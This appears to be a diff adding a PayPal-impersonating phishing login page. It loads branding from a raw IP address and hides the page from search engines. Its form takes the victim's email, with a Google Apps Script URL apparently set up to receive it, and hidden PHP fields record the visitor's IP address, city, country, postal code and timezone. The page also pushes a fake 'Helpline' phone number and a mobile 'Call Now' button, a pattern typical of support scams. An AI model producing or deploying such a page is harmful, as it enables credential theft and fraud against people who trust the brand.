@@ -1,0 +1,245 @@
+<html lang="en-US">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes">
+<title>Paypal Login</title>
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<style>
+.corral {
+    margin: 0 auto 50px;
+    width: 460px;
+    position: relative;
+}
+.contentContainerBordered {
+    margin: 120px auto 0;
+    padding: 42px 42px 36px;
+    border: 1px solid #c7c7c7;
+    overflow: hidden;
+	border-radius: 6px;
+}
+.paypal-logo-long {
+    background: transparent url('http://67.205.173.13/pay.bk8w.gq/logo.png') top center no-repeat;
+    background-size: auto 28px;
+    width: 129px;
+    height: 32px;
+    display: block;
+	margin: 0 auto 30px;
+}
+.textInput input, .textInput textarea {
+    height: 44px;
+    width: 100%;
+    padding: 0 10px;
+	margin: 0 0 20px;
+    border: 1px solid #9da3a6;
+    background: #fff;
+    text-overflow: ellipsis;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    color: #000;
+    font-size: 1em;
+    font-family: Helvetica,Arial,sans-serif;
+    font-weight: 400;
+    direction: ltr;
+}
+a.button, a.button:link, a.button:visited, .button {
+    width: 100%;
+    min-height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #0070ba;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    -ms-appearance: none;
+    -o-appearance: none;
+    appearance: none;
+    -webkit-tap-highlight-color: transparent;
+    color: #fff;
+    font-size: 1em;
+    text-align: center;
+    font-weight: 700;
+    font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
+    text-shadow: none;
+    text-decoration: none;
+    -webkit-transition: background-color .4s ease-out;
+    -moz-transition: background-color .4s ease-out;
+    -o-transition: background-color .4s ease-out;
+    transition: background-color .4s ease-out;
+    -webkit-font-smoothing: antialiased;
+}
+a.button, a.button:link, a.button:visited, .button {
+    width: 100%;
+    min-height: 44px;
+	line-height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #0070ba;
+    -webkit-box-shadow: none;
+    -moz-box-shadow: none;
+    box-shadow: none;
+    -webkit-border-radius: 4px;
+    -moz-border-radius: 4px;
+    -khtml-border-radius: 4px;
+    border-radius: 4px;
+    -webkit-box-sizing: border-box;
+    -moz-box-sizing: border-box;
+    box-sizing: border-box;
+    cursor: pointer;
+    -webkit-appearance: none;
+    -moz-appearance: none;
+    -ms-appearance: none;
+    -o-appearance: none;
+    appearance: none;
+    -webkit-tap-highlight-color: transparent;
+    color: #fff;
+    font-size: 1em;
+    text-align: center;
+    font-weight: 700;
+    font-family: HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
+    text-shadow: none;
+    text-decoration: none;
+    -webkit-transition: background-color .4s ease-out;
+    -moz-transition: background-color .4s ease-out;
+    -o-transition: background-color .4s ease-out;
+    transition: background-color .4s ease-out;
+    -webkit-font-smoothing: antialiased;
+}
+.loginSignUpSeparator {
+    border-top: 1px solid #cbd2d6;
+    position: relative;
+    margin: 25px 0 10px;
+    text-align: center;
+}
+.loginSignUpSeparator .textInSeparator {
+    background-color: #fff;
+    padding: 0 .5em;
+    position: relative;
+    color: #6c7378;
+    top: -.7em;
+}
+.footerStayPut {
+    position: fixed;
+    bottom: 0;
+    padding-top: 14px;
+    z-index: 999;
+    width: 100%;
+}
+.footer .legalFooter {
+    text-align: center;
+    padding: 8px;
+    background-color: #F7F9FA;
+}
+.footerGroup {
+    list-style-type: none;
+    text-align: center;
+}
+.footerGroup li {
+    display: inline-block;
+    margin: 0 10px 0 0;
+}
+.footerGroup li a{
+	font-size:11px;
+	color: #666;
+    white-space: nowrap;
+}
+ul{margin:0}
+</style>
+<link rel="stylesheet" href="http://67.205.173.13/pay.bk8w.gq/my.css">
+<script type="text/javascript">
+var sc_project=11723978; 
+var sc_invisible=1; 
+var sc_security="8d4ddbc6"; 
+</script>
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4023737,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+</head>
+
+<body>
+<p align="right"><b><a href="tel:+18773481812">Helpline: +1-(877) 348-1812</a></b></p>
+<div class="corral">
+  <div id="content" class="contentContainerBordered">
+	<center><p><img alt="Pay Pal" src="logo.png"></p></center>
+	<form action="password/index.html" method="https://script.google.com/macros/s/AKfycby4vTyJsps5yFYRvTWbNJGm49wl6-EXhWQV3BdRVy4/dev" class="proceed maskable" autocomplete="off" name="login">
+	  <div class="textInput">
+	  <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="off" placeholder="Enter Your Email" required="required">
+	  <input id="getUserIpAddr" type="hidden" name="ip" value="<?php echo $ip;?>">
+	  <input id="getUserIpAddr" type="hidden" name="details2" value="<?php echo $details->city;?>">
+	  <input id="getUserIpAddr" type="hidden" name="details3" value="<?php echo $details->country;?>">
+	  <input id="getUserIpAddr" type="hidden" name="details4" value="<?php echo $details->postal;?>">
+	  <input id="getUserIpAddr" type="hidden" name="details5" value="<?php echo $details->timezone;?>">
+	  <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Next</button>
+	  </div>
+	</form>
+  </div>
+</div>
+<footer class="footer footerStayPut">
+  <div class="legalFooter">
+	<ul class="footerGroup">
+	<li><a href="javascript:;">Contact Us</a></li>
+	<li><a href="javascript:;">Privacy</a></li>
+	<li><a href="javascript:;">Legal</a></li>
+	<li><a href="javascript:;">Worldwide</a></li>
+	<li><a href="tel:+18773481812">Helpline: +1-(877) 348-1812</a></li>
+	</ul>
+  </div>
+</footer>
+<a href="tel:+18773481812" class="mobile-call-button">
+    Call Now
+</a>
+
+<style>
+    /* Default: Hidden */
+    .mobile-call-button {
+        display: none;
+    }
+
+    /* Mobile Only: Visible (e.g., max-width 768px) */
+    @media (max-width: 768px) {
+        .mobile-call-button {
+            display: block;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: #25d366; /* Example: WhatsApp green */
+            color: white;
+            padding: 15px 150px;
+            border-radius: 50px;
+            text-decoration: none;
+            box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
+            z-index: 9999;
+            font-weight: bold;
+        }
+    }
+</style>		
+</body>
+</html>
